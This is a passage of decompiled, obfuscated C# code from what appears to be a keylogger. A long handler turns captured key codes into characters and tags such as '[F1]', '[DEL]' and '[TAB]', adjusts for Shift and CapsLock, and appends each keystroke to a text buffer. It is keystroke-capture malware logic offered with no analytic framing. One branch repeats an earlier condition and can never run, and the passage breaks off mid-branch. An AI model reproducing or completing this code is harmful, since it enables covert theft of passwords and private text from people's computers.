		//IL_3dbb: Unknown result type (might be due to invalid IL or missing references)
		//IL_3dbe: Invalid comparison between Unknown and I4
		//IL_3de5: Unknown result type (might be due to invalid IL or missing references)
		//IL_3de8: Invalid comparison between Unknown and I4
		//IL_3e0f: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e12: Invalid comparison between Unknown and I4
		//IL_3e39: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e3c: Invalid comparison between Unknown and I4
		//IL_3e63: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e66: Invalid comparison between Unknown and I4
		//IL_3e8d: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e90: Invalid comparison between Unknown and I4
		//IL_3eb7: Unknown result type (might be due to invalid IL or missing references)
		//IL_3eba: Invalid comparison between Unknown and I4
		//IL_3ee1: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ee3: Invalid comparison between Unknown and I4
		//IL_3f0a: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f0d: Invalid comparison between Unknown and I4
		//IL_3f34: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f37: Invalid comparison between Unknown and I4
		//IL_3f5e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f61: Invalid comparison between Unknown and I4
		//IL_3f88: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f8b: Invalid comparison between Unknown and I4
		//IL_3fb2: Unknown result type (might be due to invalid IL or missing references)
		//IL_3fb5: Invalid comparison between Unknown and I4
		//IL_3fdc: Unknown result type (might be due to invalid IL or missing references)
		//IL_3fdf: Invalid comparison between Unknown and I4
		//IL_4006: Unknown result type (might be due to invalid IL or missing references)
		//IL_4009: Invalid comparison between Unknown and I4
		//IL_4030: Unknown result type (might be due to invalid IL or missing references)
		//IL_4033: Invalid comparison between Unknown and I4
		//IL_405a: Unknown result type (might be due to invalid IL or missing references)
		//IL_405d: Invalid comparison between Unknown and I4
		//IL_4081: Unknown result type (might be due to invalid IL or missing references)
		//IL_4084: Invalid comparison between Unknown and I4
		//IL_40a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_40ab: Invalid comparison between Unknown and I4
		//IL_40cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_40d2: Invalid comparison between Unknown and I4
		if (!((Computer)Class1.smethod_0()).get_Keyboard().get_ShiftKeyDown() & !((Computer)Class1.smethod_0()).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 65)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "a");
			}
			else if ((int)Key == 66)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "b");
			}
			else if ((int)Key == 67)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "c");
			}
			else if ((int)Key == 68)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "d");
			}
			else if ((int)Key == 69)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "e");
			}
			else if ((int)Key == 70)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "f");
			}
			else if ((int)Key == 71)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "g");
			}
			else if ((int)Key == 72)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "h");
			}
			else if ((int)Key == 73)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "i");
			}
			else if ((int)Key == 74)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "j");
			}
			else if ((int)Key == 75)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "k");
			}
			else if ((int)Key == 76)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "l");
			}
			else if ((int)Key == 77)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "m");
			}
			else if ((int)Key == 78)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "n");
			}
			else if ((int)Key == 79)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "o");
			}
			else if ((int)Key == 80)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "p");
			}
			else if ((int)Key == 81)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "q");
			}
			else if ((int)Key == 82)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "r");
			}
			else if ((int)Key == 83)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "s");
			}
			else if ((int)Key == 84)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "t");
			}
			else if ((int)Key == 85)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "u");
			}
			else if ((int)Key == 86)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "v");
			}
			else if ((int)Key == 87)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "w");
			}
			else if ((int)Key == 88)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "x");
			}
			else if ((int)Key == 89)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "y");
			}
			else if ((int)Key == 90)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "z");
			}
			else if ((int)Key == 48)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "0");
			}
			else if ((int)Key == 49)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "1");
			}
			else if ((int)Key == 50)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "2");
			}
			else if ((int)Key == 51)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "3");
			}
			else if ((int)Key == 52)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "4");
			}
			else if ((int)Key == 53)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "5");
			}
			else if ((int)Key == 54)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "6");
			}
			else if ((int)Key == 55)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "7");
			}
			else if ((int)Key == 56)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "8");
			}
			else if ((int)Key == 57)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "9");
			}
			else if ((int)Key == 96)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "0");
			}
			else if ((int)Key == 97)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "1");
			}
			else if ((int)Key == 98)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "2");
			}
			else if ((int)Key == 99)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "3");
			}
			else if ((int)Key == 100)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "4");
			}
			else if ((int)Key == 101)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "5");
			}
			else if ((int)Key == 102)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "6");
			}
			else if ((int)Key == 103)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "7");
			}
			else if ((int)Key == 104)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "8");
			}
			else if ((int)Key == 105)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "9");
			}
			else if ((int)Key == 188)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + ",");
			}
			else if ((int)Key == 189)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "-");
			}
			else if ((int)Key == 222)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "'");
			}
			else if ((int)Key == 219)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[");
			}
			else if ((int)Key == 221)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "]");
			}
			else if ((int)Key == 191)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "/");
			}
			else if ((int)Key == 220)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "\\");
			}
			else if ((int)Key == 186)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + ";");
			}
			else if ((int)Key == 190)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + ".");
			}
			else if ((int)Key == 192)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "`");
			}
			else if ((int)Key == 32)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + " ");
			}
			else if ((int)Key == 13)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "\r\n");
			}
			else if ((int)Key == 112)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F1]");
			}
			else if ((int)Key == 113)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F2]");
			}
			else if ((int)Key == 114)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F3]");
			}
			else if ((int)Key == 115)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F4]");
			}
			else if ((int)Key == 116)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F5]");
			}
			else if ((int)Key == 117)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F6]");
			}
			else if ((int)Key == 118)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F7]");
			}
			else if ((int)Key == 119)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F8]");
			}
			else if ((int)Key == 120)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F9]");
			}
			else if ((int)Key == 121)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F10]");
			}
			else if ((int)Key == 122)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F11]");
			}
			else if ((int)Key == 123)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F12]");
			}
			else if ((int)Key == 46)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[DEL]");
			}
			else if ((int)Key == 8)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[DEL]");
			}
			else if ((int)Key == 40)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[DOWN ARROW]");
			}
			else if ((int)Key == 38)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[UP ARROW]");
			}
			else if ((int)Key == 37)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[LEFT ARROW]");
			}
			else if ((int)Key == 39)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[RIGHT ARROW]");
			}
			else if ((int)Key == 9)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[TAB]");
			}
			else if ((int)Key == 35)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[END]");
			}
			else if ((int)Key == 27)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[ESC]");
			}
			else if ((int)Key == 111)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "/");
			}
			else if ((int)Key == 110)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + ".");
			}
			else if ((int)Key == 109)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "-");
			}
			else if ((int)Key == 107)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "+");
			}
			else if ((int)Key == 106)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "*");
			}
		}
		else if (!((Computer)Class1.smethod_0()).get_Keyboard().get_ShiftKeyDown() & ((Computer)Class1.smethod_0()).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 65)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "A");
			}
			else if ((int)Key == 66)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "B");
			}
			else if ((int)Key == 67)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "C");
			}
			else if ((int)Key == 68)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "D");
			}
			else if ((int)Key == 69)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "E");
			}
			else if ((int)Key == 70)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "F");
			}
			else if ((int)Key == 71)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "G");
			}
			else if ((int)Key == 72)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "H");
			}
			else if ((int)Key == 73)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "I");
			}
			else if ((int)Key == 74)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "J");
			}
			else if ((int)Key == 75)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "K");
			}
			else if ((int)Key == 76)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "L");
			}
			else if ((int)Key == 77)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "M");
			}
			else if ((int)Key == 78)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "N");
			}
			else if ((int)Key == 79)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "O");
			}
			else if ((int)Key == 80)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "P");
			}
			else if ((int)Key == 81)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "Q");
			}
			else if ((int)Key == 82)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "R");
			}
			else if ((int)Key == 83)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "S");
			}
			else if ((int)Key == 84)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "T");
			}
			else if ((int)Key == 85)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "U");
			}
			else if ((int)Key == 86)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "V");
			}
			else if ((int)Key == 87)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "W");
			}
			else if ((int)Key == 88)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "X");
			}
			else if ((int)Key == 89)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "Y");
			}
			else if ((int)Key == 90)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "Z");
			}
			else if ((int)Key == 48)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "0");
			}
			else if ((int)Key == 49)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "1");
			}
			else if ((int)Key == 50)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "2");
			}
			else if ((int)Key == 51)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "3");
			}
			else if ((int)Key == 52)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "4");
			}
			else if ((int)Key == 53)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "5");
			}
			else if ((int)Key == 54)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "6");
			}
			else if ((int)Key == 55)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "7");
			}
			else if ((int)Key == 56)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "8");
			}
			else if ((int)Key == 57)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "9");
			}
			else if ((int)Key == 96)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "0");
			}
			else if ((int)Key == 97)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "1");
			}
			else if ((int)Key == 98)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "2");
			}
			else if ((int)Key == 99)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "3");
			}
			else if ((int)Key == 100)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "4");
			}
			else if ((int)Key == 101)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "5");
			}
			else if ((int)Key == 102)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "6");
			}
			else if ((int)Key == 103)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "7");
			}
			else if ((int)Key == 104)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "8");
			}
			else if ((int)Key == 105)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "9");
			}
			else if ((int)Key == 188)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + ",");
			}
			else if ((int)Key == 189)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "-");
			}
			else if ((int)Key == 222)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "'");
			}
			else if ((int)Key == 219)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[");
			}
			else if ((int)Key == 221)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "]");
			}
			else if ((int)Key == 191)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "/");
			}
			else if ((int)Key == 220)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "\\");
			}
			else if ((int)Key == 186)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + ";");
			}
			else if ((int)Key == 190)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + ".");
			}
			else if ((int)Key == 192)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "`");
			}
			else if ((int)Key == 32)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + " ");
			}
			else if ((int)Key == 13)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "\r\n");
			}
			else if ((int)Key == 112)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F1]");
			}
			else if ((int)Key == 113)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F2]");
			}
			else if ((int)Key == 114)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F3]");
			}
			else if ((int)Key == 115)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F4]");
			}
			else if ((int)Key == 116)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F5]");
			}
			else if ((int)Key == 117)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F6]");
			}
			else if ((int)Key == 118)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F7]");
			}
			else if ((int)Key == 119)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F8]");
			}
			else if ((int)Key == 120)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F9]");
			}
			else if ((int)Key == 121)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F10]");
			}
			else if ((int)Key == 122)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F11]");
			}
			else if ((int)Key == 123)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F12]");
			}
			else if ((int)Key == 46)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[DEL]");
			}
			else if ((int)Key == 8)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[DEL]");
			}
			else if ((int)Key == 40)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[DOWN ARROW]");
			}
			else if ((int)Key == 38)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[UP ARROW]");
			}
			else if ((int)Key == 37)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[LEFT ARROW]");
			}
			else if ((int)Key == 39)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[RIGHT ARROW]");
			}
			else if ((int)Key == 9)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[TAB]");
			}
			else if ((int)Key == 35)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[END]");
			}
			else if ((int)Key == 27)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[ESC]");
			}
			else if ((int)Key == 111)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "/");
			}
			else if ((int)Key == 110)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + ".");
			}
			else if ((int)Key == 109)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "-");
			}
			else if ((int)Key == 107)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "+");
			}
			else if ((int)Key == 106)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "*");
			}
		}
		else if (((Computer)Class1.smethod_0()).get_Keyboard().get_ShiftKeyDown() & ((Computer)Class1.smethod_0()).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 49)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "!");
			}
			else if ((int)Key == 50)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "@");
			}
			else if ((int)Key == 51)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "#");
			}
			else if ((int)Key == 52)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "$");
			}
			else if ((int)Key == 53)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "%");
			}
			else if ((int)Key == 54)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "^");
			}
			else if ((int)Key == 55)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "&");
			}
			else if ((int)Key == 56)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "*");
			}
			else if ((int)Key == 57)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "(");
			}
			else if ((int)Key == 48)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + ")");
			}
			else if ((int)Key == 65)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "A");
			}
			else if ((int)Key == 66)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "B");
			}
			else if ((int)Key == 67)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "C");
			}
			else if ((int)Key == 68)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "D");
			}
			else if ((int)Key == 69)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "E");
			}
			else if ((int)Key == 70)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "F");
			}
			else if ((int)Key == 71)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "G");
			}
			else if ((int)Key == 72)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "H");
			}
			else if ((int)Key == 73)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "I");
			}
			else if ((int)Key == 74)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "J");
			}
			else if ((int)Key == 75)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "K");
			}
			else if ((int)Key == 76)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "L");
			}
			else if ((int)Key == 77)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "M");
			}
			else if ((int)Key == 78)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "N");
			}
			else if ((int)Key == 79)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "O");
			}
			else if ((int)Key == 80)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "P");
			}
			else if ((int)Key == 81)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "Q");
			}
			else if ((int)Key == 82)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "R");
			}
			else if ((int)Key == 83)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "S");
			}
			else if ((int)Key == 84)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "T");
			}
			else if ((int)Key == 85)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "U");
			}
			else if ((int)Key == 86)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "V");
			}
			else if ((int)Key == 87)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "W");
			}
			else if ((int)Key == 88)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "X");
			}
			else if ((int)Key == 89)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "Y");
			}
			else if ((int)Key == 90)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "Z");
			}
			else if ((int)Key == 188)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "<");
			}
			else if ((int)Key == 189)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "_");
			}
			else if ((int)Key == 219)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "{");
			}
			else if ((int)Key == 221)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "}");
			}
			else if ((int)Key == 191)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "?");
			}
			else if ((int)Key == 220)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "|");
			}
			else if ((int)Key == 186)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + ":");
			}
			else if ((int)Key == 190)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + ">");
			}
			else if ((int)Key == 192)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "~");
			}
			else if ((int)Key == 32)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + " ");
			}
			else if ((int)Key == 13)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "\r\n");
			}
			else if ((int)Key == 112)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F1]");
			}
			else if ((int)Key == 113)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F2]");
			}
			else if ((int)Key == 114)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F3]");
			}
			else if ((int)Key == 115)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F4]");
			}
			else if ((int)Key == 116)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F5]");
			}
			else if ((int)Key == 117)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F6]");
			}
			else if ((int)Key == 118)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F7]");
			}
			else if ((int)Key == 119)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F8]");
			}
			else if ((int)Key == 120)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F9]");
			}
			else if ((int)Key == 121)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F10]");
			}
			else if ((int)Key == 122)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F11]");
			}
			else if ((int)Key == 123)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[F12]");
			}
			else if ((int)Key == 46)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[DEL]");
			}
			else if ((int)Key == 8)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[DEL]");
			}
			else if ((int)Key == 40)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[DOWN ARROW]");
			}
			else if ((int)Key == 38)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[UP ARROW]");
			}
			else if ((int)Key == 37)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[LEFT ARROW]");
			}
			else if ((int)Key == 39)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[RIGHT ARROW]");
			}
			else if ((int)Key == 9)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[TAB]");
			}
			else if ((int)Key == 35)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[END]");
			}
			else if ((int)Key == 27)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "[ESC]");
			}
			else if ((int)Key == 111)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "/");
			}
			else if ((int)Key == 110)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + ".");
			}
			else if ((int)Key == 109)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "-");
			}
			else if ((int)Key == 107)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "+");
			}
			else if ((int)Key == 106)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "*");
			}
		}
		else if (!((Computer)Class1.smethod_0()).get_Keyboard().get_ShiftKeyDown() & ((Computer)Class1.smethod_0()).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 49)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "1");
			}
			else if ((int)Key == 50)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "2");
			}
			else if ((int)Key == 51)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "3");
			}
			else if ((int)Key == 52)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "4");
			}
			else if ((int)Key == 53)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "5");
			}
			else if ((int)Key == 54)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "6");
			}
			else if ((int)Key == 55)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "7");
			}
			else if ((int)Key == 56)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "8");
			}
			else if ((int)Key == 57)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "9");
			}
			else if ((int)Key == 48)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "0");
			}
			else if ((int)Key == 65)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "a");
			}
			else if ((int)Key == 66)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "b");
			}
			else if ((int)Key == 67)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "c");
			}
			else if ((int)Key == 68)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "d");
			}
			else if ((int)Key == 69)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "e");
			}
			else if ((int)Key == 70)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "f");
			}
			else if ((int)Key == 71)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "g");
			}
			else if ((int)Key == 72)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "h");
			}
			else if ((int)Key == 73)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "i");
			}
			else if ((int)Key == 74)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "j");
			}
			else if ((int)Key == 75)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "k");
			}
			else if ((int)Key == 76)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "l");
			}
			else if ((int)Key == 77)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "m");
			}
			else if ((int)Key == 78)
			{
				vmethod_22().set_Text(vmethod_22().get_Text() + "n");
			}
			else if ((int)Key == 79)
			{
